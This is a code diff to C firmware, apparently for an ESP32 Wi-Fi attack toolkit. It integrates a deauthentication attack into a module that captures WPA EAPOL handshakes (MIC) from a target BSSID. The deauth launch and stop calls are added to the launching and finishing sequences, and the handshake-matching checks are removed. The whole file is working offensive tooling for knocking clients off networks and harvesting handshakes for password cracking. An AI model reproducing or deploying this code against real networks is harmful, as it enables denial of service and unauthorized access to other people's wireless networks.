@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <string.h>
 
+#include "arma_deauth.h"
 #include "arma_utils.h"
 #include "esp_err.h"
 #include "esp_event.h"
@@ -15,47 +16,14 @@ ESP_EVENT_DECLARE_BASE(ARMAMENT_ATTACK_STATUS_EVENT_BASE);
 static uint8_t int_target_bssid[6];
 static TaskHandle_t mic_sniff_task_handle = NULL;
 
-static uint8_t current_eapol_message_number = 0;
-static uint8_t current_eapol_station_mac[6];
-
 void mic_notif(void *args, esp_event_base_t event_base, int32_t event_id,
                void *event_data) {
   arma_atk_event_data_t *notification_data;
   notification_data = (arma_atk_event_data_t *)event_data;
-  printf("arma_mic.mic_notif > Received notification\n");
 
-  if (notification_data->atk_context != MIC_BASED) {
-    printf("arma_mic.mic_notif > Not a mic based notification\n");
-    return;
-  }
-
-  if (memcmp(notification_data->bssid, int_target_bssid, 6) != 0) {
-    printf("arma_mic.mic_notif > Unmatch BSSID from first message\n");
-    return;
-  }
-
-  if (notification_data->message_number == 1) {
-    if (current_eapol_message_number == 1) {
-      printf("arma_mic.mic_notif > Duplicate first eapol message received\n");
-    } else if (current_eapol_message_number == 0) {
-      printf("arma_mic.mic_notif > First eapol message received\n");
-      memcpy(current_eapol_station_mac, notification_data->station_mac, 6);
-      current_eapol_message_number = 1;
-    }
-  } else if (notification_data->message_number == 2) {
-    if (current_eapol_message_number == 0) {
-      // m2 or second eapol message, m1 or first eapol message
-      printf("arma_mic.mic_notif > Received m2 before m1\n");
-      return;
-    }
-
-    if (memcmp(notification_data->station_mac, current_eapol_station_mac, 6) !=
-        0) {
-      printf("arma_mic.mic_notif > Unmatch Station from second message\n");
-    } else {
-      current_eapol_message_number = 0;
-      arma_mic_finishing_sequence(0);
-    }
+  if (notification_data->atk_context == MIC_BASED) {
+    printf("arma_mic.mic_notif > Received notification\n");
+    arma_mic_finishing_sequence(0);
   }
 }
 
@@ -80,10 +48,13 @@ void arma_delete_task_mic_sniff_duration() {
 
 void arma_mic_finishing_sequence(uint8_t from_sniff_task) {
   printf("arma_mic.arma_mic_finishing_sequence > Finishing sequence\n");
-  frame_parser_clear_target_parameter();
   frame_parser_unregister_data_frame_handler();
+  frame_parser_clear_target_parameter();
   arma_mic_notif_event_unregister();
   wifi_sniffer_stop();
+  // Uses the deauth armament to deauthenticate clients
+  arma_deauth_finish();
+  // Kill the task mic sniff duration
   if (from_sniff_task == 0) {
     arma_delete_task_mic_sniff_duration();
   }
@@ -103,13 +74,17 @@ void arma_mic_sniff_duration() {
 }
 
 void arma_mic_launching_sequence(uint8_t channel) {
-  printf("arma_mic.arma_mic_finishing_sequence > Launching sequence\n");
+  printf("arma_mic.arma_mic_launching_sequence > Launching sequence\n");
   frame_parser_set_target_parameter(int_target_bssid, PARSE_MIC);
   frame_parser_register_data_frame_handler();
   arma_mic_notif_event_register();
   wifi_sniffer_start();
   wifi_set_filter(DATA);
   wifi_set_channel(channel);
+  // Uses the deauth armament to deauthenticate clients
+  arma_mic_set_target_bssid(int_target_bssid);
+  arma_deauth_launching_sequence(channel);
+  // Create a the task MIC sniff duration
   xTaskCreatePinnedToCore(arma_mic_sniff_duration, TMS_NAME, TMS_STACK_SIZE,
                           NULL, TMS_PRIORITY, &mic_sniff_task_handle,
                           TMS_CORE_ID);
